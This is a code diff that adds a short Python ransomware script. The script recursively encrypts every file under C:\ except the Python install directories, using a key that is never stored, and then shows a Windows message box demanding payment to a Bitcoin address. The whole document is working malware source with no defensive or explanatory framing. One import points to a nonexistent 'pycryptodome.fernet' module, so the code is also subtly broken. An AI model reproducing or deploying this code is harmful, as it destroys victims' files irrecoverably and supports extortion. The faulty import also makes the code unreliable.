@@ -1,0 +1,36 @@
+import os
+import sys
+import ctypes
+import pycryptodome
+from pycryptodome.fernet import Fernet
+
+def is_system_file(file_path):
+    if file_path.startswith(sys.prefix) or file_path.startswith(sys.exec_prefix):
+        return True
+    return False
+
+def encrypt_file(file_path, key):
+    with open(file_path, 'rb') as file:
+        data = file.read()
+    f = Fernet(key)
+    encrypted_data = f.encrypt(data)
+    with open(file_path, 'wb') as file:
+        file.write(encrypted_data)
+
+def encrypt_files(directory, key):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if not is_system_file(file_path):
+                encrypt_file(file_path, key)
+
+def generate_key():
+    return Fernet.generate_key()
+
+def show_ransom_note(bitcoin_address):
+    ctypes.windll.user32.MessageBoxW(0, f"All your files have been encrypted.\n\nBitcoin address: {bitcoin_address}", "Ransomware Alert!", 0)
+
+if __name__ == "__main__":
+    key = generate_key()
+    encrypt_files("C:\\", key)
+    show_ransom_note("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")
